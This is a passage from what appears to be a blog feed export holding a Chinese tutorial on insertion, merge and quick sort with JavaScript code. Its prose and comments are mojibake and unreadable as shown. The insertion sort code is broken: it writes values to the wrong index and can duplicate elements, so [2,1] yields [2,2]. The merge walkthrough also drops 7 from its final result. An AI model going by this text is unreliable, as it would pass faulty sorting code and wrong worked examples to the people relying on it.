æ’å…¥æŽ’åºç‰¹ç‚¹åœ¨å†’æ³¡æŽ’åºä¸­ï¼Œç»è¿‡æ¯ä¸€è½®çš„æŽ’åºå¤„ç†åŽï¼Œæ•°ç»„åŽç«¯çš„æ•°æ˜¯æŽ’å¥½åºçš„ï¼›è€Œå¯¹äºŽæ’å…¥æŽ’åºæ¥è¯´ï¼Œç»è¿‡æ¯ä¸€è½®çš„æŽ’åºå¤„ç†åŽï¼Œæ•°ç»„å‰ç«¯çš„æ•°éƒ½æ˜¯æŽ’å¥½åºçš„ã€‚ æ’å…¥æŽ’åºä¾‹é¢˜åˆ†æžå¯¹æ•°ç»„ [2, 1, 7, 9, 5, 8] è¿›è¡Œæ’å…¥æŽ’åºã€‚ æ’å…¥æŽ’åºè§£é¢˜æ€è·¯ é¦–å…ˆå°†æ•°ç»„åˆ†æˆå·¦å³ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå·¦è¾¹æ˜¯å·²ç»æŽ’å¥½åºçš„éƒ¨åˆ†ï¼Œå³è¾¹æ˜¯è¿˜æ²¡æœ‰æŽ’å¥½åºçš„éƒ¨åˆ†ï¼Œåˆšå¼€å§‹ï¼Œå·¦è¾¹å·²æŽ’å¥½åºçš„éƒ¨åˆ†åªæœ‰ç¬¬ä¸€ä¸ªå…ƒç´  2ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯¹å³è¾¹çš„å…ƒç´ ä¸€ä¸ªä¸€ä¸ªè¿›è¡Œå¤„ç†ï¼Œå°†å®ƒä»¬æ”¾åˆ°å·¦è¾¹ã€‚ å…ˆæ¥çœ‹ 1ï¼Œç”±äºŽ 1 æ¯” 2 å°ï¼Œéœ€è¦å°† 1 æ’å…¥åˆ° 2 çš„å‰é¢ï¼Œåšæ³•å¾ˆç®€å•ï¼Œä¸¤ä¸¤äº¤æ¢ä½ç½®å³å¯ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚ ç„¶åŽï¼Œæˆ‘ä»¬è¦æŠŠ 7 æ’å…¥åˆ°å·¦è¾¹çš„éƒ¨åˆ†ï¼Œç”±äºŽ 7 å·²ç»æ¯” 2 å¤§äº†ï¼Œè¡¨æ˜Žå®ƒæ˜¯ç›®å‰æœ€å¤§çš„å…ƒç´ ï¼Œä¿æŒä½ç½®ä¸å˜ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚ åŒç†ï¼Œ9 ä¹Ÿä¸éœ€è¦åšä½ç½®å˜åŠ¨ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚ æŽ¥ä¸‹æ¥ï¼Œå¦‚ä½•æŠŠ 5 æ’å…¥åˆ°åˆé€‚çš„ä½ç½®ã€‚é¦–å…ˆæ¯”è¾ƒ 5 å’Œ 9ï¼Œç”±äºŽ 5 æ¯” 9 å°ï¼Œä¸¤ä¸¤äº¤æ¢ï¼Œ[1, 2, 7, 5, 9, 8]ï¼Œç»§ç»­ï¼Œç”±äºŽ 5 æ¯” 7 å°ï¼Œä¸¤ä¸¤äº¤æ¢ï¼Œ[1, 2, 5, 7, 9, 8]ï¼Œæœ€åŽï¼Œç”±äºŽ 5 æ¯” 2 å¤§ï¼Œæ­¤è½®ç»“æŸã€‚ æœ€åŽä¸€ä¸ªæ•°æ˜¯ 8ï¼Œç”±äºŽ 8 æ¯” 9 å°ï¼Œä¸¤ä¸¤äº¤æ¢ï¼Œ[1, 2, 5, 7, 8, 9]ï¼Œå†æ¯”è¾ƒ 7 å’Œ 8ï¼Œå‘çŽ° 8 æ¯” 7 å¤§ï¼Œæ­¤è½®ç»“æŸã€‚åˆ°æ­¤ï¼Œæ’å…¥æŽ’åºå®Œæ¯•ã€‚ æ’å…¥æŽ’åºä»£ç ç¤ºä¾‹123456789101112131415161718192021// æ’å…¥æŽ’åºconst insertionSort = function (arr) &#123; const len = arr.length for (let i = 1; i &lt; len; i++) &#123; let current = arr[i] for (let j = i - 1; j &gt;= 0; j--) &#123; // current å°äºŽ j æŒ‡å‘çš„å·¦ä¾§å€¼ï¼Œå°† j æŒ‡å‘å·¦ä¾§å€¼å³ç§»ä¸€ä½ if (current &lt; arr[j]) &#123; arr[j + 1] = arr[j] &#125; else &#123; // å¦åˆ™å°† current æ’å…¥åˆ° j ä½ç½®ï¼Œè·³å‡ºå†…å¾ªçŽ¯ arr[j] = current break &#125; &#125; &#125;&#125;const arr = [2, 1, 7, 9, 5, 8]insertionSort(arr)console.log('arr: ', arr) æ’å…¥æŽ’åºç®—æ³•åˆ†æžæ’å…¥æŽ’åºç©ºé—´å¤æ‚åº¦å‡è®¾æ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œç”±äºŽåœ¨æ•´ä¸ªæŽ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯ç›´æŽ¥åœ¨ç»™å®šçš„æ•°ç»„é‡Œé¢è¿›è¡Œå…ƒç´ çš„ä¸¤ä¸¤äº¤æ¢ï¼Œç©ºé—´å¤æ‚åº¦æ˜¯ O(1)ã€‚ æ’å…¥æŽ’åºæ—¶é—´å¤æ‚åº¦ ç»™å®šçš„æ•°ç»„æŒ‰ç…§é¡ºåºå·²ç»æŽ’å¥½ã€‚åªéœ€è¦è¿›è¡Œ n-1 æ¬¡çš„æ¯”è¾ƒï¼Œä¸¤ä¸¤äº¤æ¢æ¬¡æ•°ä¸º 0ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚è¿™æ˜¯æœ€å¥½çš„æƒ…å†µã€‚ ç»™å®šçš„æ•°ç»„æŒ‰ç…§é€†åºæŽ’åˆ—ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œ n(n-1)/2 æ¬¡æ¯”è¾ƒï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚è¿™æ˜¯æœ€åçš„æƒ…å†µã€‚ ç»™å®šçš„æ•°ç»„æ‚ä¹±æ— ç« ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚ ç”±æ­¤å¯è§ï¼Œå’Œå†’æ³¡æŽ’åºä¸€æ ·ï¼Œæ’å…¥æŽ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ï¼Œå¹¶ä¸”å®ƒä¹Ÿæ˜¯ä¸€ç§ç¨³å®šçš„æŽ’åºç®—æ³•ã€‚ å½’å¹¶æŽ’åºï¼ˆMerge Sortï¼‰å½’å¹¶æŽ’åºåŸºæœ¬æ€æƒ³æ ¸å¿ƒæ˜¯åˆ†æ²»ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå¤æ‚çš„é—®é¢˜åˆ†æˆä¸¤ä¸ªæˆ–å¤šä¸ªç›¸åŒæˆ–ç›¸ä¼¼çš„å­é—®é¢˜ï¼Œç„¶åŽæŠŠå­é—®é¢˜åˆ†æˆæ›´å°çš„å­é—®é¢˜ï¼Œç›´åˆ°å­é—®é¢˜å¯ä»¥ç®€å•çš„ç›´æŽ¥æ±‚è§£ï¼Œæœ€åŽŸé—®é¢˜çš„è§£å°±æ˜¯å­é—®é¢˜è§£çš„åˆå¹¶ã€‚å½’å¹¶æŽ’åºå°†åˆ†æ²»çš„æ€æƒ³ä½“çŽ°å¾—æ·‹æ¼“å°½è‡´ã€‚ å½’å¹¶æŽ’åºå®žçŽ°ä¸€å¼€å§‹å…ˆæŠŠæ•°ç»„ä»Žä¸­é—´åˆ’åˆ†æˆä¸¤ä¸ªå­æ•°ç»„ï¼Œä¸€ç›´é€’å½’åœ°æŠŠå­æ•°ç»„åˆ’åˆ†æˆæ›´å°çš„å­æ•°ç»„ï¼Œç›´åˆ°å­æ•°ç»„é‡Œé¢åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæ‰å¼€å§‹æŽ’åºã€‚ æŽ’åºçš„æ–¹æ³•å°±æ˜¯æŒ‰ç…§å¤§å°é¡ºåºåˆå¹¶ä¸¤ä¸ªå…ƒç´ ï¼ŒæŽ¥ç€ä¾æ¬¡æŒ‰ç…§é€’å½’çš„è¿”å›žé¡ºåºï¼Œä¸æ–­åœ°åˆå¹¶æŽ’å¥½åºçš„å­æ•°ç»„ï¼Œç›´åˆ°æœ€åŽæŠŠæ•´ä¸ªæ•°ç»„çš„é¡ºåºæŽ’å¥½ã€‚ å½’å¹¶æŽ’åºä»£ç ç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// å½’å¹¶æŽ’åºconst mergeSort = function (arr, lo, hi) &#123; if (lo === undefined) &#123; lo = 0 &#125; if (hi === undefined) &#123; hi = arr.length - 1 &#125; // åˆ¤æ–­æ˜¯å¦å‰©ä¸‹æœ€åŽä¸€ä¸ªå…ƒç´  if (lo &gt;= hi) return // ä»Žä¸­é—´å°†æ•°ç»„åˆ†æˆä¸¤éƒ¨åˆ† let mid = lo + Math.floor((hi - lo) / 2) console.log('mid', mid) // åˆ†åˆ«é€’å½’å°†å·¦å³ä¸¤è¾¹æŽ’å¥½åº mergeSort(arr, lo, mid) mergeSort(arr, mid + 1, hi) // å°†æŽ’å¥½åºçš„å·¦å³ä¸¤åŠåˆå¹¶ merge(arr, lo, mid, hi)&#125;const merge = function (arr, lo, mid, hi) &#123; // å¤åˆ¶ä¸€ä»½åŽŸæ¥çš„æ•°ç»„ const copy = [...arr] // å®šä¹‰ä¸€ä¸ª k æŒ‡é’ˆè¡¨ç¤ºä»Žä»€ä¹ˆä½ç½®å¼€å§‹ä¿®æ”¹åŽŸæ¥çš„æ•°ç»„ï¼Œ // i æŒ‡é’ˆè¡¨ç¤ºå·¦è¾¹åŠçš„èµ·å§‹ä½ç½® // j æŒ‡é’ˆä¾¿æ˜¯å³åŠè¾¹çš„å…¶å®žä½ç½® let k = lo let i = lo let j = mid + 1 while (k &lt;= hi) &#123; if (i &gt; mid) &#123; arr[k++] = copy[j++] &#125; else if (j &gt; hi) &#123; arr[k++] = copy[i++] &#125; else if (copy[j] &lt; copy[i]) &#123; arr[k++] = copy[j++] &#125; else &#123; arr[k++] = copy[i++] &#125; &#125;&#125;const arr = [2, 1, 7, 9, 5, 8]mergeSort(arr)console.log('arr: ', arr) å…¶ä¸­ï¼ŒWhile è¯­å¥æ¯”è¾ƒï¼Œä¸€å…±å¯èƒ½ä¼šå‡ºçŽ°å››ç§æƒ…å†µã€‚ å·¦åŠè¾¹çš„æ•°éƒ½å¤„ç†å®Œæ¯•ï¼Œåªå‰©ä¸‹å³åŠè¾¹çš„æ•°ï¼Œåªéœ€è¦å°†å³åŠè¾¹çš„æ•°é€ä¸ªæ‹·è´è¿‡åŽ»ã€‚ å³åŠè¾¹çš„æ•°éƒ½å¤„ç†å®Œæ¯•ï¼Œåªå‰©ä¸‹å·¦åŠè¾¹çš„æ•°ï¼Œåªéœ€è¦å°†å·¦åŠè¾¹çš„æ•°é€ä¸ªæ‹·è´è¿‡åŽ»å°±å¥½ã€‚ å³è¾¹çš„æ•°å°äºŽå·¦è¾¹çš„æ•°ï¼Œå°†å³è¾¹çš„æ•°æ‹·è´åˆ°åˆé€‚çš„ä½ç½®ï¼Œj æŒ‡é’ˆå¾€å‰ç§»åŠ¨ä¸€ä½ã€‚ å·¦è¾¹çš„æ•°å°äºŽå³è¾¹çš„æ•°ï¼Œå°†å·¦è¾¹çš„æ•°æ‹·è´åˆ°åˆé€‚çš„ä½ç½®ï¼Œi æŒ‡é’ˆå¾€å‰ç§»åŠ¨ä¸€ä½ã€‚ å½’å¹¶æŽ’åºä¾‹é¢˜åˆ†æžåˆ©ç”¨å½’å¹¶æŽ’åºç®—æ³•å¯¹æ•°ç»„ [2, 1, 7, 9, 5, 8] è¿›è¡ŒæŽ’åºã€‚ å½’å¹¶æŽ’åºè§£é¢˜æ€è·¯ é¦–å…ˆä¸æ–­åœ°å¯¹æ•°ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œç›´åˆ°å„ä¸ªå­æ•°ç»„é‡ŒåªåŒ…å«ä¸€ä¸ªå…ƒç´ ã€‚æŽ¥ä¸‹æ¥é€’å½’åœ°æŒ‰ç…§å¤§å°é¡ºåºåˆå¹¶åˆ‡åˆ†å¼€çš„å­æ•°ç»„ï¼Œé€’å½’çš„é¡ºåºå’ŒäºŒå‰æ ‘é‡Œçš„å‰å‘éåŽ†ç±»ä¼¼ã€‚ åˆå¹¶ [2] å’Œ [1] ä¸º [1, 2]ã€‚ å­æ•°ç»„ [1, 2] å’Œ [7] åˆå¹¶ã€‚ å³è¾¹ï¼Œåˆå¹¶ [9] å’Œ [5]ã€‚ ç„¶åŽåˆå¹¶ [5, 9] å’Œ [8]ã€‚ æœ€åŽåˆå¹¶ [1, 2, 7] å’Œ [5, 8, 9] æˆ [1, 2, 5, 8, 9]ï¼Œå°±å¯ä»¥æŠŠæ•´ä¸ªæ•°ç»„æŽ’å¥½åºäº†ã€‚ åˆå¹¶æ•°ç»„ [1, 2, 7] å’Œ [5, 8, 9] çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹ã€‚ æŠŠæ•°ç»„ [1, 2, 7] ç”¨ L è¡¨ç¤ºï¼Œ[5, 8, 9] ç”¨ R è¡¨ç¤ºã€‚ åˆå¹¶çš„æ—¶å€™ï¼Œå¼€è¾Ÿåˆ†é…ä¸€ä¸ªæ–°æ•°ç»„ T ä¿å­˜ç»“æžœï¼Œæ•°ç»„å¤§å°åº”è¯¥æ˜¯ä¸¤ä¸ªå­æ•°ç»„é•¿åº¦çš„æ€»å’Œ ç„¶åŽä¸‹æ ‡ iã€jã€k åˆ†åˆ«æŒ‡å‘æ¯ä¸ªæ•°ç»„çš„èµ·å§‹ç‚¹ã€‚ æŽ¥ä¸‹æ¥ï¼Œæ¯”è¾ƒä¸‹æ ‡ i å’Œ j æ‰€æŒ‡å‘çš„å…ƒç´  L[i] å’Œ R[j]ï¼ŒæŒ‰ç…§å¤§å°é¡ºåºæ”¾å…¥åˆ°ä¸‹æ ‡ k æŒ‡å‘çš„åœ°æ–¹ï¼Œ1 å°äºŽ 5ã€‚ ç§»åŠ¨ i å’Œ kï¼Œç»§ç»­æ¯”è¾ƒ L[i] å’Œ R[j]ï¼Œ2 æ¯” 5 å°ã€‚ i å’Œ k ç»§ç»­å¾€å‰ç§»åŠ¨ï¼Œ5 æ¯” 7 å°ã€‚ ç§»åŠ¨ j å’Œ kï¼Œç»§ç»­æ¯”è¾ƒ L[i] å’Œ R[j]ï¼Œ7 æ¯” 8 å°ã€‚ è¿™æ—¶å€™ï¼Œå·¦è¾¹çš„æ•°ç»„å·²ç»å¤„ç†å®Œæ¯•ï¼Œç›´æŽ¥å°†å³è¾¹æ•°ç»„å‰©ä½™çš„å…ƒç´ æ”¾åˆ°ç»“æžœæ•°ç»„é‡Œå°±å¥½ã€‚ åˆå¹¶ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œå…ˆå†³æ¡ä»¶å¿…é¡»æ˜¯ä¸¤ä¸ªå­æ•°ç»„éƒ½å·²ç»åˆ†åˆ«æŽ’å¥½åºäº†ã€‚ å½’å¹¶æŽ’åºç®—æ³•åˆ†æžå½’å¹¶æŽ’åºç©ºé—´å¤æ‚åº¦ç”±äºŽåˆå¹¶ n ä¸ªå…ƒç´ éœ€è¦åˆ†é…ä¸€ä¸ªå¤§å°ä¸º n çš„é¢å¤–æ•°ç»„ï¼Œåˆå¹¶å®Œæˆä¹‹åŽï¼Œè¿™ä¸ªæ•°ç»„çš„ç©ºé—´å°±ä¼šè¢«é‡Šæ”¾ï¼Œæ‰€ä»¥ç®—æ³•çš„ç©ºé—´å¤æ‚åº¦å°±æ˜¯ O(n)ã€‚å½’å¹¶æŽ’åºä¹Ÿæ˜¯ç¨³å®šçš„æŽ’åºç®—æ³•ã€‚ å½’å¹¶æŽ’åºæ—¶é—´å¤æ‚åº¦å½’å¹¶ç®—æ³•æ˜¯ä¸€ä¸ªä¸æ–­é€’å½’çš„è¿‡ç¨‹ã€‚ ä¸¾ä¾‹ï¼šæ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ T(n) çš„å‡½æ•°ã€‚ è§£æ³•ï¼šæŠŠè¿™ä¸ªè§„æ¨¡ä¸º n çš„é—®é¢˜åˆ†æˆä¸¤ä¸ªè§„æ¨¡åˆ†åˆ«ä¸º n/2 çš„å­é—®é¢˜ï¼Œæ¯ä¸ªå­é—®é¢˜çš„æ—¶é—´å¤æ‚åº¦å°±æ˜¯ T(n/2)ï¼Œé‚£ä¹ˆä¸¤ä¸ªå­é—®é¢˜çš„å¤æ‚åº¦å°±æ˜¯ 2Ã—T(n/2)ã€‚å½“ä¸¤ä¸ªå­é—®é¢˜éƒ½å¾—åˆ°äº†è§£å†³ï¼Œå³ä¸¤ä¸ªå­æ•°ç»„éƒ½æŽ’å¥½äº†åºï¼Œéœ€è¦å°†å®ƒä»¬åˆå¹¶ï¼Œä¸€å…±æœ‰ n ä¸ªå…ƒç´ ï¼Œæ¯æ¬¡éƒ½è¦è¿›è¡Œæœ€å¤š n-1 æ¬¡çš„æ¯”è¾ƒï¼Œæ‰€ä»¥åˆå¹¶çš„å¤æ‚åº¦æ˜¯ O(n)ã€‚ç”±æ­¤æˆ‘ä»¬å¾—åˆ°äº†é€’å½’å¤æ‚åº¦å…¬å¼ï¼šT(n) = 2Ã—T(n/2) + O(n)ã€‚ å¯¹äºŽå…¬å¼æ±‚è§£ï¼Œä¸æ–­åœ°æŠŠä¸€ä¸ªè§„æ¨¡ä¸º n çš„é—®é¢˜åˆ†è§£æˆè§„æ¨¡ä¸º n/2 çš„é—®é¢˜ï¼Œä¸€ç›´åˆ†è§£åˆ°è§„æ¨¡å¤§å°ä¸º 1ã€‚å¦‚æžœ n ç­‰äºŽ 2ï¼Œåªéœ€è¦åˆ†ä¸€æ¬¡ï¼›å¦‚æžœ n ç­‰äºŽ 4ï¼Œéœ€è¦åˆ† 2 æ¬¡ã€‚è¿™é‡Œçš„æ¬¡æ•°æ˜¯æŒ‰ç…§è§„æ¨¡å¤§å°çš„å˜åŒ–åˆ†ç±»çš„ã€‚ ä»¥æ­¤ç±»æŽ¨ï¼Œå¯¹äºŽè§„æ¨¡ä¸º n çš„é—®é¢˜ï¼Œä¸€å…±è¦è¿›è¡Œ log(n) å±‚çš„å¤§å°åˆ‡åˆ†ã€‚åœ¨æ¯ä¸€å±‚é‡Œï¼Œæˆ‘ä»¬éƒ½è¦è¿›è¡Œåˆå¹¶ï¼Œæ‰€æ¶‰åŠåˆ°çš„å…ƒç´ å…¶å®žå°±æ˜¯æ•°ç»„é‡Œçš„æ‰€æœ‰å…ƒç´ ï¼Œå› æ­¤ï¼Œæ¯ä¸€å±‚çš„åˆå¹¶å¤æ‚åº¦éƒ½æ˜¯ O(n)ï¼Œæ‰€ä»¥æ•´ä½“çš„å¤æ‚åº¦å°±æ˜¯ O(nlogn)ã€‚ å¿«é€ŸæŽ’åºï¼ˆQuick Sortï¼‰å¿«é€ŸæŽ’åºåŸºæœ¬æ€æƒ³å¿«é€ŸæŽ’åºä¹Ÿé‡‡ç”¨äº†åˆ†æ²»çš„æ€æƒ³ã€‚ å¿«é€ŸæŽ’åºå®žçŽ°æŠŠåŽŸå§‹çš„æ•°ç»„ç­›é€‰æˆè¾ƒå°å’Œè¾ƒå¤§çš„ä¸¤ä¸ªå­æ•°ç»„ï¼Œç„¶åŽé€’å½’åœ°æŽ’åºä¸¤ä¸ªå­æ•°ç»„ã€‚ ä¸¾ä¾‹ï¼šæŠŠç­çº§é‡Œçš„æ‰€æœ‰åŒå­¦æŒ‰ç…§é«˜çŸ®é¡ºåºæŽ’æˆä¸€æŽ’ã€‚ è§£æ³•ï¼šè€å¸ˆå…ˆéšæœºåœ°æŒ‘é€‰äº†åŒå­¦ Aï¼Œè®©æ‰€æœ‰å…¶ä»–åŒå­¦å’ŒåŒå­¦ A æ¯”é«˜çŸ®ï¼Œæ¯” A çŸ®çš„éƒ½ç«™åœ¨ A çš„å·¦è¾¹ï¼Œæ¯” A é«˜çš„éƒ½ç«™åœ¨ A çš„å³è¾¹ã€‚æŽ¥ä¸‹æ¥ï¼Œè€å¸ˆåˆ†åˆ«ä»Žå·¦è¾¹åˆ°å³è¾¹çš„åŒå­¦é‡Œé€‰æ‹©äº†åŒå­¦ B å’ŒåŒå­¦ Cï¼Œç„¶åŽä¸æ–­çš„ç­›é€‰å’ŒæŽ’åˆ—ä¸‹åŽ»ã€‚ åœ¨åˆ†æˆè¾ƒå°å’Œè¾ƒå¤§çš„ä¸¤ä¸ªå­æ•°ç»„è¿‡ç¨‹ä¸­ï¼Œå¦‚ä½•é€‰å®šä¸€ä¸ªåŸºå‡†å€¼ï¼ˆä¹Ÿå°±æ˜¯åŒå­¦ Aã€Bã€C ç­‰ï¼‰å°¤ä¸ºå…³é”®ã€‚ å¿«é€ŸæŽ’åºå®žçŽ°ä¾‹é¢˜åˆ†æžå¯¹æ•°ç»„[2,1,7,9,5,8]è¿›è¡ŒæŽ’åºã€‚ å¿«é€ŸæŽ’åºè§£é¢˜æ€è·¯ æŒ‰ç…§å¿«é€ŸæŽ’åºçš„æ€æƒ³ï¼Œé¦–å…ˆæŠŠæ•°ç»„ç­›é€‰æˆè¾ƒå°å’Œè¾ƒå¤§çš„ä¸¤ä¸ªå­æ•°ç»„ã€‚ éšæœºä»Žæ•°ç»„é‡Œé€‰å–ä¸€ä¸ªæ•°ä½œä¸ºåŸºå‡†å€¼ï¼Œæ¯”å¦‚ 7ï¼ŒäºŽæ˜¯åŽŸå§‹çš„æ•°ç»„å°±è¢«åˆ†æˆé‡Œä¸¤ä¸ªå­æ•°ç»„ã€‚æ³¨æ„ï¼šå¿«é€ŸæŽ’åºæ˜¯ç›´æŽ¥åœ¨åŽŸå§‹æ•°ç»„é‡Œè¿›è¡Œå„ç§äº¤æ¢æ“ä½œï¼Œæ‰€ä»¥å½“å­æ•°ç»„è¢«åˆ†å‰²å‡ºåŽ»çš„æ—¶å€™ï¼ŒåŽŸå§‹æ•°ç»„é‡Œçš„æŽ’åˆ—ä¹Ÿè¢«æ”¹å˜äº†ã€‚ æŽ¥ä¸‹æ¥ï¼Œåœ¨è¾ƒå°çš„å­æ•°ç»„é‡Œé€‰ 2 ä½œä¸ºåŸºå‡†å€¼ï¼Œåœ¨è¾ƒå¤§çš„å­æ•°ç»„é‡Œé€‰ 8 ä½œä¸ºåŸºå‡†å€¼ï¼Œç»§ç»­åˆ†å‰²å­æ•°ç»„ã€‚ ç»§ç»­å°†å…ƒç´ ä¸ªæ•°å¤§äºŽ 1 çš„å­æ•°ç»„è¿›è¡Œåˆ’åˆ†ï¼Œå½“æ‰€æœ‰å­æ•°ç»„é‡Œçš„å…ƒç´ ä¸ªæ•°éƒ½ä¸º 1 çš„æ—¶å€™ï¼ŒåŽŸå§‹æ•°ç»„ä¹Ÿè¢«æŽ’å¥½åºäº†ã€‚ å¿«é€ŸæŽ’åºä»£ç ç¤ºä¾‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// å¿«é€ŸæŽ’åºconst quickSort = function (arr, lo, hi) &#123; if (lo === undefined) &#123; lo = 0 &#125; if (hi === undefined) &#123; hi = arr.length - 1 &#125; // åˆ¤æ–­æ˜¯å¦åªå‰©ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ï¼Œåˆ™ç›´æŽ¥è¿”å›ž if (lo &gt;= hi) return // åˆ©ç”¨ partition å‡½æ•°æ‰¾åˆ°ä¸€ä¸ªéšæœºçš„åŸºå‡†ç‚¹ const p = partition(arr, lo, hi) // é€’å½’å¯¹åŸºå‡†ç‚¹å·¦åŠè¾¹å’Œå³åŠè¾¹çš„æ•°è¿›è¡ŒæŽ’åº quickSort(arr, lo, p - 1) quickSort(arr, p + 1, hi)&#125;// äº¤æ¢æ•°ç»„ä½ç½®const swap = function (arr, i, j) &#123; let temp = arr[i] arr[i] = arr[j] arr[j] = temp&#125;// éšæœºèŽ·å–ä½ç½®ç´¢å¼•const randomPos = function (lo, hi) &#123; return lo + Math.floor(Math.random() * (hi - lo))&#125;const partition = function (arr, lo, hi) &#123; const pos = randomPos(lo, hi) console.log('pos: ', pos) swap(arr, pos, hi) let i = lo let j = lo // ä»Žå·¦åˆ°å³ç”¨æ¯ä¸ªæ•°å’ŒåŸºå‡†å€¼æ¯”è¾ƒï¼Œè‹¥æ¯”åŸºå‡†å€¼å°ï¼Œåˆ™æ”¾åœ¨æŒ‡é’ˆ i æŒ‡å‘çš„ä½ç½® // å¾ªçŽ¯å®Œæ¯•åŽï¼Œi æŒ‡é’ˆä¹‹å‰çš„æ•°éƒ½æ¯”åŸºå‡†å€¼å° while (j &lt; hi) &#123; if (arr[j] &lt;= arr[hi]) &#123; swap(arr, i++, j) &#125; j++ &#125; // æœ«å°¾çš„åŸºå‡†å€¼æ”¾ç½®åˆ°æŒ‡é’ˆ i çš„ä½ç½®ï¼Œ i æŒ‡é’ˆä¹‹åŽçš„æ•°éƒ½æ¯”åŸºå‡†å€¼å¤§ swap(arr, i, j) // è¿”å›žæŒ‡é’ˆ iï¼Œä½œä¸ºåŸºå‡†ç‚¹çš„ä½ç½® return i&#125;const arr = [2, 1, 7, 9, 5, 8]quickSort(arr)console.log(arr) å¿«é€ŸæŽ’åºç®—æ³•åˆ†æžå¿«é€ŸæŽ’åºæ—¶é—´å¤æ‚åº¦1ã€æœ€ä¼˜æƒ…å†µï¼šè¢«é€‰å‡ºæ¥çš„åŸºå‡†å€¼éƒ½æ˜¯å½“å‰å­æ•°ç»„çš„ä¸­é—´æ•°ã€‚è¿™æ ·çš„åˆ†å‰²ï¼Œèƒ½ä¿è¯å¯¹äºŽä¸€ä¸ªè§„æ¨¡å¤§å°ä¸º n çš„é—®é¢˜ï¼Œèƒ½è¢«å‡åŒ€åˆ†è§£æˆä¸¤ä¸ªè§„æ¨¡å¤§å°ä¸º n/2 å­é—®é¢˜ï¼ˆå½’å¹¶æŽ’åºä¹Ÿé‡‡ç”¨äº†ç›¸åŒçš„åˆ’åˆ†æ–¹æ³•ï¼‰ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯ï¼š T(n)=2xT(n/2) + O(n)ã€‚ æŠŠè§„æ¨¡å¤§å°ä¸º n çš„é—®é¢˜åˆ†è§£æˆ n/2 çš„ä¸¤ä¸ªå­é—®é¢˜æ—¶ï¼Œå’ŒåŸºå‡†å€¼è¿›è¡Œäº† n-1 æ¬¡æ¯”è¾ƒï¼Œå¤æ‚åº¦å°±æ˜¯ O(n)ã€‚å¾ˆæ˜¾ç„¶ï¼Œåœ¨æœ€ä¼˜æƒ…å†µä¸‹ï¼Œå¿«é€ŸæŽ’åºçš„å¤æ‚åº¦ä¹Ÿæ˜¯ O(nlogn)ã€‚ 2ã€æœ€åæƒ…å†µï¼šåŸºå‡†å€¼é€‰æ‹©äº†å­æ•°ç»„é‡Œçš„æœ€å¤§åŽè€…æœ€å°å€¼ã€‚ æ¯æ¬¡éƒ½æŠŠå­æ•°ç»„åˆ†æˆäº†ä¸¤ä¸ªæ›´å°çš„å­æ•°ç»„ï¼Œå…¶ä¸­ä¸€ä¸ªçš„é•¿åº¦ä¸º 1ï¼Œå¦å¤–ä¸€ä¸ªçš„é•¿åº¦åªæ¯”åŽŸå­æ•°ç»„å°‘ 1ã€‚ ä¸¾ä¾‹ï¼šå¯¹äºŽæ•°ç»„æ¥è¯´ï¼Œæ¯æ¬¡æŒ‘é€‰çš„åŸºå‡†å€¼åˆ†åˆ«æ˜¯ 9ã€8ã€7ã€5ã€2ã€‚ è§£æ³•ï¼šåˆ’åˆ†è¿‡ç¨‹å’Œå†’æ³¡æŽ’åºçš„è¿‡ç¨‹ç±»ä¼¼ã€‚ ç®—æ³•å¤æ‚åº¦ä¸º O(n^2)ã€‚ æç¤ºï¼šå¯ä»¥é€šè¿‡éšæœºåœ°é€‰å–åŸºå‡†å€¼æ¥é¿å…å‡ºçŽ°æœ€åçš„æƒ…å†µã€‚ å¿«é€ŸæŽ’åºç©ºé—´å¤æ‚åº¦å’Œå½’å¹¶æŽ’åºä¸åŒï¼Œå¿«é€ŸæŽ’åºåœ¨æ¯æ¬¡é€’å½’çš„è¿‡ç¨‹ä¸­ï¼Œåªéœ€è¦å¼€è¾Ÿ O(1) çš„å­˜å‚¨ç©ºé—´æ¥å®Œæˆäº¤æ¢æ“ä½œå®žçŽ°ç›´æŽ¥å¯¹æ•°ç»„çš„ä¿®æ”¹ï¼Œåˆå› ä¸ºé€’å½’æ¬¡æ•°ä¸º lognï¼Œæ‰€ä»¥å®ƒçš„æ•´ä½“ç©ºé—´å¤æ‚åº¦å®Œå…¨å–å†³äºŽåŽ‹å †æ ˆçš„æ¬¡æ•°ï¼Œå› æ­¤ï¼Œå®ƒçš„ç©ºé—´å¤æ‚åº¦æ˜¯ O(logn)]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FE-resource]]></title>
    <url>%2F2020%2F11%2F04%2FFE-resource%2F</url>
